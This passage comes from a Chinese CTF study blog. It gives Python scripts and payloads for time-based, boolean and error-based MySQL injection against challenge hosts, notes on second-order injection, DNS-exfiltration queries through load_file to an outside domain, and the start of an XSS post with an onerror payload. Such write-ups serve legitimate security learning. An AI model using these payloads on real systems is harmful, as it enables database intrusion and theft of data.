:&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>这道题是<strong>盲注</strong>题目说得也很明白，问题是怎么注入呢？这里有两个问题</p><ul><li>第一个是理解<code>insert...into</code>注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into client_ip(ip) values (&#39;$ip&#39;);</span><br><span class="line">&#x2F;&#x2F;这里主要结合sleep()进行注入</span><br><span class="line">insert into student(id,name) values (1,&#39;&#39;+(select sleep(3)))</span><br><span class="line">&#x2F;&#x2F;这样就插入了一条id&#x3D;1,name&#x3D;null的数据</span><br></pre></td></tr></table></figure><ul><li>第二个是过滤逗号的，<strong>所以不能用<code>if(a,b,c)</code>应该用<code>case...when...then</code>同时常用的截取字符串函数<code>substr([str],[start],[len])</code>也有替代的<code>substr([str]from [strat] for [len])</code></strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">case...when...then</span><br><span class="line">简单case函数</span><br><span class="line">case sex when &#39;1&#39; then &#39;nan&#39;</span><br><span class="line">when &#39;2&#39; then &#39;nv&#39;</span><br><span class="line">else &#39;qita&#39; end</span><br><span class="line">case搜索函数</span><br><span class="line">case when sex &#x3D; &#39;1&#39; then &#39;nan&#39;</span><br><span class="line"> when sex &#x3D; &#39;2&#39; then &#39;nv</span><br><span class="line"> else &#39;qita&#39; end</span><br></pre></td></tr></table></figure><p>接下来只需要构造就可以了、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;1&#39; (case substr(database()from 1 for 1) &#x3D; [string] then sleep(3) else 1 end))#&quot;</span><br><span class="line">&#x2F;&#x2F;最后一个)用来闭合 #用来注释</span><br></pre></td></tr></table></figure><p>接下来就可以写脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        payload = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">        headers = &#123;<span class="string">'x-forwarded-for'</span>:payload&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url = url,headers = headers,timeout = <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"flag is :&#123;"</span> +flag+<span class="string">"&#125;"</span>)</span><br><span class="line">//数据库</span><br><span class="line">payload = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">库为web15</span><br><span class="line">//表</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select group_concat(table_name)from information_schema.tables where table_schema='web15') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">表为client_ip,flag</span><br><span class="line">//列</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select group_concat(column_name)from information_schema.columns where table_name='flag') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">flag</span><br><span class="line">//flag</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select * from flag) from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br></pre></td></tr></table></figure><p>就可以得到flag了。</p><blockquote><p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p></blockquote><h3 id="多次（mid布尔盲注）"><a href="#多次（mid布尔盲注）" class="headerlink" title="多次（mid布尔盲注）"></a>多次（mid布尔盲注）</h3><p>主要学习一下<strong>异或注入</strong>判断过滤了哪些关键词</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">异或：1^1&#x3D;0，1^0&#x3D;1，0^1&#x3D;1，0^0&#x3D;0</span><br><span class="line">这样当构造：?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+</span><br><span class="line">若返回正确页面的回显(There is nothing.)，则说明(length(&#39;and&#39;)&#x3D;0)为假;</span><br><span class="line">若返回错误页面的回显(Error,Error,Error!)，则说明(length(&#39;and&#39;)&#x3D;0)为真。</span><br><span class="line"></span><br><span class="line">这里?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+均回显了Error,Error,Error!，说明(length(&#39;and&#39;)&#x3D;0)为真，那么可判断and被过滤了</span><br><span class="line">同理可判断or、select、union也被过滤了</span><br><span class="line">selselectect</span><br><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>注意的是：information中也有or</p><p>继续学习盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class="line">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag2&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)p</span><br><span class="line">        payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select binary group_concat(flag2) from flag2),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class="line">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class="line">        if &#39;Nobody&#39; not in r.text:</span><br><span class="line">            data +&#x3D; j</span><br><span class="line">            break</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure><p>同时了解一下报错注入</p><p>好像注入的时候是不需要select的，但在mysql中是需要的</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200816164858101.png" alt="image-20200816164858101"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1%27%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database())),1)%20--+</span><br></pre></td></tr></table></figure><h3 id="ctfhub（if布尔盲注）"><a href="#ctfhub（if布尔盲注）" class="headerlink" title="ctfhub（if布尔盲注）"></a>ctfhub（if布尔盲注）</h3><p>根据题目可知用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(a,b,c) a对就执行b，否则就执行c</span><br></pre></td></tr></table></figure><p>这个题目正好是id=1,2会对，3就错所以我们把b=1或2，c为3</p><p>接下来写脚本就可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((mid((select database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),1,3)&quot;.format(i,j)</span><br><span class="line">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class="line">        if &#39;query_success&#39; in r.text:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br><span class="line">#表</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i,j)</span><br><span class="line">#列</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br><span class="line">#flag</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(flag)from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br></pre></td></tr></table></figure><p>不过中间好像是服务器会关闭所以我们可以分组扫描</p><p>比如从1-30，30-50</p><h3 id="ctfhub（if时间盲注）"><a href="#ctfhub（if时间盲注）" class="headerlink" title="ctfhub（if时间盲注）"></a>ctfhub（if时间盲注）</h3><p>和上一题一样直接写脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        try:</span><br><span class="line">            payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">            r &#x3D; s.get(url&#x3D;payload,timeout&#x3D;1)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br><span class="line">#表</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">#列</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">#flag</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(flag) from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br></pre></td></tr></table></figure><h3 id="3-基于报错的SQL盲注"><a href="#3-基于报错的SQL盲注" class="headerlink" title="3.基于报错的SQL盲注"></a>3.基于报错的SQL盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">' and updataxml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+   //查看用户</span></span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+  //查看数据库</span></span><br><span class="line"><span class="string">'</span> <span class="keyword">and</span> updataxml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+    //查看数据库的名字</span></span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span><span class="keyword">test</span> <span class="string">' limit 0,1),0x7e),1) --+     //查看各表的名字</span></span><br><span class="line"><span class="string">'</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'my student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+   //查看列的名字</span></span><br></pre></td></tr></table></figure><h2 id="4-二次注入"><a href="#4-二次注入" class="headerlink" title="4.二次注入"></a>4.二次注入</h2><h3 id="0x01二次注入原理"><a href="#0x01二次注入原理" class="headerlink" title="0x01二次注入原理"></a>0x01二次注入原理</h3><p><strong>防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</strong></p><ul><li><p>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p></li><li><p>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p></li></ul><h2 id="5-DNS注入"><a href="#5-DNS注入" class="headerlink" title="5.DNS注入"></a>5.DNS注入</h2><h3 id="0x01DNS"><a href="#0x01DNS" class="headerlink" title="0x01DNS"></a>0x01DNS</h3><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609202338069.png" alt="image-20200609202338069"></p><h3 id="0x02注入函数"><a href="#0x02注入函数" class="headerlink" title="0x02注入函数"></a>0x02注入函数</h3><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609203639074.png" alt="image-20200609203639074"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;D:&#x2F;1.txt&quot;);  &#x2F;&#x2F;读取文件</span><br><span class="line">select load_file(&quot;\\\\xxx.php90.cn\\ccc&quot;)      &#x2F;&#x2F;转义</span><br></pre></td></tr></table></figure><h3 id="0x03注入"><a href="#0x03注入" class="headerlink" title="0x03注入"></a>0x03注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&quot;\\\\&quot;,(select database()),&quot;xxx.php90.cn\\cc&quot;));</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,(select username from admin),&quot;xxx.php90.cn\\cc&quot;));</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,select HEX(username) from admin limit 0,1),&quot;xxx.php90.cn\\cc&quot;));</span><br></pre></td></tr></table></figure><h2 id="6-报错注入"><a href="#6-报错注入" class="headerlink" title="6.报错注入"></a>6.报错注入</h2><p>更详细的解释<a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。</p><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code></p><h3 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h3><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。<br>使用条件：mysql版本&gt;5.1.5</p><p><strong>extractvalue函数</strong></p><blockquote><p>函数原型：extractvalue(xml_document,Xpath_string)<br>正常语法：extractvalue(xml_document,Xpath_string);<br>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：Xpath_string是xpath格式的字符串<br>作用：从目标xml中返回包含所查询值的字符串</p></blockquote><p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p><p>pyload：<code>id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(select语句))))</code></p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))</span><br><span class="line">id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,@@version)))</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>针对mysql数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">爆表名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))</span><br><span class="line">爆字段名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))</span><br><span class="line">爆数据：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>注：</p><ul><li>① 0x7e=’~’</li><li>② concat(‘a’,‘b’)=“ab”</li><li>③ version()=@@version</li><li>④ ‘~‘可以换成’#’、’$’等不满足xpath格式的字符</li><li>⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li></ul><p><strong>updatexml</strong></p><blockquote><p>函数原型：updatexml(xml_document,xpath_string,new_value)<br>正常语法：updatexml(xml_document,xpath_string,new_value)<br>第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串<br>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</p></blockquote><p>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同<br>payload：<code>id=&#39;and(select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(select语句())),&quot;anything&quot;))</code></p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))</span><br><span class="line">&#39;and(select updatexml(1,concat(0x7e,@@database),1))</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>同样，针对mysql：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">爆表名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e))</span><br><span class="line">爆列名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">爆数据：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure><h3 id="concat-rand-group-by-导致主键重复"><a href="#concat-rand-group-by-导致主键重复" class="headerlink" title="concat+rand()+group_by()导致主键重复"></a>concat+rand()+group_by()导致主键重复</h3><p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</p><p><strong>rand()：</strong></p><blockquote><p>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</p></blockquote><p><strong>floor()：</strong></p><blockquote><p>对任意正或者负的十进制值向下取整</p></blockquote><p>通常利用这两个函数的方法是<code>floor(rand(0))*2</code> ,其会生成0和1两个数</p><p><strong>group by</strong></p><blockquote><p>group by是根据一个或多个列对结果集进行分组的sql语句，其用法为：<br>SELECT column_name, aggregate_function(column_name)<br>FROM table_name<br>WHERE column_name operator value<br>GROUP BY column_name</p></blockquote><p>报错的原因是因为<strong>rand()函数在查询的时候会执行一次,插入的时候还会执行一次.</strong>这就是整个语句报错的关键</p><p>前面说过floor(rand(0)<em>2) 前六位是<em>*0110110</em></em></p><p><strong>group by x先建立一个空表,用于分组.</strong>然后进行分组查询,第一次rand()执行,查询的结果是0,因为是空表所以插入这条,而插入的时候rand()又执行了一次,所以表中的结果就是</p><p><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212511240-1317180655.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212511240-1317180655.png" alt="img"></a></p><p>第一次执行完,接着执行rand()的值为1,因为表中存在,所以加1,表中结果成为</p><p><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212558220-1728511223.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212558220-1728511223.png" alt="img"></a></p><p>到了第三次执行rand()是值为0,因为表中不存在所以要插入新的数据,<strong>这次插入rand()再次执行,所以插入的又是1.而表中已经存在1了</strong></p><p><strong>此时插入因为重复出现同一个key,就会出现报错 重复出现key.而报错中会说明那个key有问题,我们的key中结合了想要了解的字符串root@localhost</strong></p><p><strong>这样就实现了报错注入,拿到了自己想要的数据</strong></p><p><strong><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212741685-206782122.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212741685-206782122.png" alt="img"></a></strong></p><p>这就是整个报错注入的原理了,rand(),floor() group by 函数缺一不可.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure><p>看一下ctfhub报错注入</p><h3 id="ctfhub报错注入"><a href="#ctfhub报错注入" class="headerlink" title="ctfhub报错注入"></a>ctfhub报错注入</h3><p>查表</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145102761.png" alt="image-20200817145102761"></p><p>查flag</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145552296.png" alt="image-20200817145552296"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我就单纯想把这些东西存下来&lt;/p&gt;
&lt;h1 id=&quot;基础学习&quot;&gt;&lt;a href=&quot;#基础学习&quot; class=&quot;headerlink&quot; title=&quot;基础学习&quot;&gt;&lt;/a&gt;基础学习&lt;/h1&gt;&lt;h2 id=&quot;1-SQL注入的分类&quot;&gt;&lt;a href=&quot;#1-SQL注入的分类&quot; cl</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>xss</title>
    <link href="https://pz1o.top/2020/12/09/xss/"/>
    <id>https://pz1o.top/2020/12/09/xss/</id>
    <published>2020-12-09T15:34:13.000Z</published>
    <updated>2020-12-09T15:36:11.388Z</updated>
    
    <content type="html"><![CDATA[<p>这篇更乱，也就那个小挑战还算完整</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="理解同步和异步："><a href="#理解同步和异步：" class="headerlink" title="理解同步和异步："></a>理解同步和异步：</h3><p>举个例子，比如有一个网页，html和php，php会延时执行。</p><p>同步：只有当php执行完之后，才会显示html网页。</p><p>异步：刷新之后，会立即显示html网页，之后再显示php执行的内容。</p><h3 id="js设置cookie"><a href="#js设置cookie" class="headerlink" title="js设置cookie"></a>js设置cookie</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;phpsessid&#x3D;      &quot;;</span><br></pre></td></tr></table></figure><h2 id="0x01存储xss"><a href="#0x01存储xss" class="headerlink" title="0x01存储xss"></a>0x01存储xss</h2><p>存储型xss主要是攻击者将xss代码插入到页面上，然后存在数据库里，当访问者访问这个页面时，就会导致xss代码执行。</p><p>出现场景：编辑内容（xss代码）可以保存，并且可以再次访问这个内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="0x02反射xss"><a href="#0x02反射xss" class="headerlink" 